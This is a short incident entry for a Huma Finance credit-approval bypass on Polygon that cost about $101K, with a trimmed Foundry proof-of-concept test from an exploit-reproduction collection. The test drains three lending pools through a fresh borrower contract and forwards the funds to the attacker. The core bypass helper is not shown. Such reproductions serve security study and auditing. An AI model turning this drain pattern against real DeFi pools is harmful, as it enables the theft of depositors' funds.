# [?] HumaFinance - Credit Approval Bypass

## Summary
Severity: Unknown
Chain: Polygon
Component: HumaCreditApprovalBypass
Published: 2026-05-11
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-05/HumaCreditApprovalBypass_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$101K (82,315 USDC + 19,074 USDC.e)

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 86_725_403;
        vm.createSelectFork("polygon", forkBlock);
        vm.label(address(POOL_USDC), "Huma USDC Pool");
        vm.label(address(POOL_USDCE_A), "Huma USDC.e Pool A");
        vm.label(address(POOL_USDCE_B), "Huma USDC.e Pool B");
        vm.label(address(USDC_NATIVE), "USDC");
        vm.label(address(USDC_BRIDGED), "USDC.e");
        vm.label(ATTACKER, "Attacker");
    }

    function testExploit() public {
        // step 0: snapshot attacker EOA balances of both stolen assets
        uint256 usdcBefore = USDC_NATIVE.balanceOf(ATTACKER);
        uint256 usdceBefore = USDC_BRIDGED.balanceOf(ATTACKER);

        // step 1: drain each pool from a fresh, unprivileged borrower (this contract)
        uint256 usdcDrained = drainPool(POOL_USDC, USDC_NATIVE);
        uint256 usdceDrained = drainPool(POOL_USDCE_A, USDC_BRIDGED) + drainPool(POOL_USDCE_B, USDC_BRIDGED);

        // step 2: forward proceeds to the attacker EOA, mirroring sweepToken in the real tx
        USDC_NATIVE.transfer(ATTACKER, USDC_NATIVE.balanceOf(address(this)));
        USDC_BRIDGED.transfer(ATTACKER, USDC_BRIDGED.balanceOf(address(this)));

        uint256 usdcProfit = USDC_NATIVE.balanceOf(ATTACKER) - usdcBefore;
        uint256 usdceProfit = USDC_BRIDGED.balanceOf(ATTACKER) - usdceBefore;
        emit log_named_decimal_uint("Attacker USDC profit", usdcProfit, 6);
        emit log_named_decimal_uint("Attacker USDC.e profit", usdceProfit, 6);

        assertEq(usdcProfit, usdcDrained, "USDC profit forwarded");
        assertEq(usdceProfit, usdceDrained, "USDC.e profit forwarded");
        assertGt(usdcProfit, 80_000e6, "drained native USDC pool");
        assertGt(usdceProfit, 18_000e6, "drained USDC.e pools");
    }
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-05/HumaCreditApprovalBypass_exp.sol_
